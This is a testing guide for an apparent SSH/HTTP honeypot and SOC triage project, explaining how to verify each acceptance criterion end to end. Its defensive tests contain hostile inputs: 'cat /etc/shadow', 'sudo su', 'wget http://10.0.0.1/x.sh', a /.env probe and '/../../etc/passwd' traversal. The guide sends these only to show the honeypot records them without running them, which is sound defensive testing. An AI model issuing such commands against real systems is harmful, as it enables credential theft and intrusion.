# TESTING.md

How to verify each acceptance criterion by hand, with what a pass actually
looks like. Written so you can tell a real pass from a script that exits 0
without checking anything.

Run everything at once:

```bash
npm run test:all
```

---

## Quick reference

| Command | Needs | Time | Proves |
| --- | --- | --- | --- |
| `npm test` | nothing | ~5s | 47 unit tests, LLM mocked |
| `npm run typecheck` | nothing | ~5s | `tsc` clean |
| `npm run test:mcp` | nothing | ~10s | Real MCP client handshake + tool calls |
| `npm run test:mcp-robustness` | nothing | ~10s | 11 hostile inputs, no crash |
| `npm run test:pipeline` | nothing | ~15s | Pipeline fails loudly without a key |
| `npm run test:autoclose` | nothing | ~15s | Campaign auto-close persists |
| `npm run test:http` | nothing | ~15s | HTTP honeypot over a real socket |
| `npm run verify:honeypot` | honeypot running | ~3s | No-execution invariant |
| `npm run test:concurrency` | honeypot running | ~10s | N simultaneous sessions, one event each |
| `npm run test:ask` | Gemini key in `.env` | ~30s | `ask_soc_agent` answers from real data |
| `npm run test:studio` | Gemini key + `npm run dev` | ~30s | Live trace appears in Mastra Studio |

The last two are deliberately **not** in `test:all`: they spend a live API call,
so the default suite stays runnable with no key and no cost.

---

## The standard: execute it, don't inspect it

An acceptance criterion is not satisfied until it has been executed end to end
with real inputs. A tool appearing in a list, a handler existing, a test that
never calls the thing it names — none of these count. They assert the code
*parses and registers*, which is a strictly weaker claim than *works*.

This is not a hypothetical. On 2026-09-27 `ask_soc_agent` — the tool that makes
this an analyst rather than a log dumper — was broken on every single call. The
agent built `Memory` with no storage provider, which does not fail at
construction; it throws on the first invocation. The MCP wire test listed the
tool and never called it, so the suite was green the whole time. It shipped
that way because "the tool is registered" and "the tool works" were being
treated as the same claim.

The same gap appeared in the MCP handshake, the pipeline exit code, the honeypot
verifier, and a test that passed because a stale process held the port. Treat a
green suite as evidence the code runs, not evidence a feature works.

Two rules that follow:

1. **A test that does not call the thing it is named for is not a test of it.**
2. **A test that cannot fail is worse than no test**, because it is counted.
   Before trusting a new guard, break the code it guards and confirm it goes
   red. Both files added for this (`tests/ask-soc-agent.test.ts`,
   `tests/observability.test.ts`) were checked that way, and one of them
   initially did *not* go red — which is how the weakness was found.

## Tests that need a live key or a running service

### `npm run test:ask` -- ask_soc_agent over MCP

Seeds an isolated temporary store, starts a real MCP server as a child process,
and asks a question that can only be answered from stored data.

This covers a bug that was invisible for a long time. The agent declared
`new Memory({ options })` with no storage provider. That does not fail when the
agent is built -- it throws on the *first call*, so every question returned
"Memory requires a storage provider to function". The MCP wire test only
discovered the tool, never invoked it, so the suite stayed green.

To confirm the test is not vacuous: delete the `storage:` line from
`src/mastra/agents/soc-agent.ts` and three assertions fail.

### `npm run test:studio` -- live trace in Mastra Studio

Starts the `triageWorkflow` *through the Studio API* and polls
`/api/observability/traces` until a span appears.

The through-the-API detail matters. Spans are written to an in-process DuckDB
observability store, so running triage from a separate script produces no
visible trace regardless of what it does. The test also compares against a
baseline span count, so it cannot pass on a trace left over from a previous
run.

---

## FR1 — Honeypot records structured events

```bash
npm run keys          # once
npm run honeypot      # terminal 1
npx tsx scripts/probe-honeypot.ts   # terminal 2
```

**Pass:** the probe prints `auth accepted (honeypot accepts anything)`, and
`data/events.jsonl` gains one line per session with `id`, `timestamp`,
`sourceIp`, `sourcePort`, `usernameTried`, `passwordTried`,
`commandsAttempted`, `sessionDurationMs`.

**Fail:** file missing, or zero new lines.

## Security invariant — commands are recorded, never executed

This is the PRD's central claim, so verify it explicitly:

```bash
npm run honeypot      # terminal 1
npm run verify:honeypot   # terminal 2
```

The script connects for real, runs `whoami`, `id`, `cat /etc/shadow`,
`sudo su`, `touch /tmp/soc-verify-pwned`, and `wget http://10.0.0.1/x.sh`,
then asserts:

- `/tmp/soc-verify-pwned` was never created
- `/tmp/evil.sh` was never created
- the `wget` payload appears **verbatim** in the log
- the server returned canned replies for all of it

**Pass:** `HONEYPOT VERIFICATION: PASS`, exit 0.

**Fail:** any `FAIL` line, exit 1.

Check it yourself too:

```bash
ls /tmp/soc-verify-pwned 2>/dev/null && echo "BREACH" || echo "safe"
grep -c wget data/events.jsonl
```

## HTTP honeypot (stretch)

```bash
npm run honeypot:http   # 127.0.0.1:8080
```

```bash
curl -s localhost:8080/admin            # 401, like a real admin panel
curl -s localhost:8080/.env             # decoy credentials
curl -sI localhost:8080/phpmyadmin     # 302, stays inside the honeypot
```

Recorded events land in the same `data/events.jsonl` with `service: "http"`, so
they flow through triage and correlation with no special handling — a run of
admin/config probes from one IP becomes one campaign.

Same security invariant: every response comes from a static table, and the
source is scanned by the test to confirm no execution primitive exists.

```bash
npm run test:http    # 26 assertions over a real socket
```

Covers decoy responses, credential capture, six classes of hostile input
(traversal, null byte, 4KB path, SQL-ish query, unicode, encoded traversal),
a raw non-HTTP payload on the socket, and event integrity.

## Concurrency

A public port is scanned by many hosts at once, so simultaneous connections
are the normal case:

```bash
npm run honeypot            # terminal 1
npm run test:concurrency    # terminal 2
CONCURRENCY=40 npm run test:concurrency   # push it harder
```

**Pass:** every session completes, all N events are recorded with **unique**
ids, all N usernames appear, the listener still accepts connections
afterwards, and no payload executed. Duplicated ids here would mean
interleaved sessions clobbering each other — the bug this catches.

## FR2–3 — Normalizer validates and skips bad lines

```bash
printf '%s\n' \
  'garbage' \
  '{"id":"x","timestamp":"nope"' \
  '{"id":"y"}' > /tmp/bad.jsonl
npx tsx -e "import {readEvents} from './src/mastra/normalizer'; readEvents('/tmp/bad.jsonl').then(e=>console.log('parsed:',e.length))"
```

**Pass:** `parsed: 0`, with `[normalizer] skipped ...` warnings on stderr. One
corrupt line must never take out the valid lines around it — the unit test
`recovers valid events around truncated, binary and junk lines` proves a good
event either side of three different kinds of corruption still parses.

## FR4 — LLM triage and geo/ASN enrichment

Needs a real key in `.env` (`AIza…`).

```bash
npm run honeypot &      # capture something first
npx tsx scripts/probe-honeypot.ts
npm run pipeline
```

**Pass:** `Enriched N/N event(s)` with N > 0, and `data/enriched.jsonl`
containing `classification`, `severity` 1–5, `country`, `asn`.

**Without a key** the pipeline must fail, not pretend:

```bash
env -u GOOGLE_GENERATIVE_AI_API_KEY npm run pipeline; echo "exit: $?"
```

**Pass:** `PIPELINE FAILED: no events were enriched.` and `exit: 1`. If you see
`exit: 0` with zero enriched events, that bug is back.

## FR5 — Correlation

```bash
npm run seed && npm run correlate
```

**Pass:** lines like `198.51.100.23 … -> campaign xxxxxxxx (6 events, max sev 5)`,
then `15 campaign(s) stored`. Six events from one IP inside the 30-minute
window must collapse into **one** campaign.

`npm run test:autoclose` additionally proves a campaign past its idle window
transitions to `closed` and that a *separate process* reads that back.

## FR6 — Reports

**Pass:** `reports/campaign-*.md` exists for any campaign at severity ≥ 4 or
with ≥ 5 events. Re-running `npm run correlate` refreshes the same file rather
than creating a duplicate.

Read `examples/example-report.md` for a committed example.

## FR7 — MCP server

**The in-process test is not enough.** It passed once while no MCP client could
connect at all, which is why the wire test exists:

```bash
npm run test:mcp
```

**Pass:** a real client completes the handshake, lists exactly
`get_recent_campaigns`, `get_campaign_detail`, `ask_soc_agent`, and calls two of
them against a seeded store. Look for `MCP WIRE TEST: PASS`.

Handy for poking at it yourself:

```bash
npm run mcp      # stdio; then use any MCP client, e.g. Claude Desktop
```

> **Version constraint.** Pinned to `@mastra/mcp@1.18.0` + MCP client SDK 1.x.
> `@mastra/mcp@2.x` depends on a server SDK that speaks only protocol
> `2026-07-28`, which **no published MCP client supports** — upgrading breaks
> every real client. Do not bump it without re-running `npm run test:mcp`.

Malformed input:

```bash
npm run test:mcp-robustness
```

**Pass:** 11 assertions, including a SQL-injection-shaped id (returns
`{"found": false}`, does not execute) and wrong-typed arguments (clean
validation error, no crash).

## FR8 — Dashboard

```bash
npm run dashboard
```

| Route | Expect |
| --- | --- |
| `/` | Landing page (after `npm run setup`) |
| `/dashboard` | SOC console with KPIs, severity chart, campaigns |
| `/enriched.jsonl` | Raw events feeding both |
| `/assets/*` | Hashed JS/CSS |

**Pass:** all 200. Path traversal (`/../../etc/passwd`) must return **404**.

If `/` shows "The landing page has not been built", run `npm run setup`.

## Determinism

Correlation and reporting never call an LLM. With the same input file you get
byte-identical output, so:

```bash
npm run seed && npm run correlate && md5 reports/*.md
```

Re-run and compare. Gemini quota cannot affect this.

---

## Fresh-clone check

```bash
git clone https://github.com/0xsan7/Honeypot.git honeypot-test
cd honeypot-test
npm install
cp .env.example .env
npm run setup
npm run dashboard
```

Takes well under two minutes on a warm cache. If any step above needed a
command this file does not mention, that is a bug in the docs — please open an
issue.
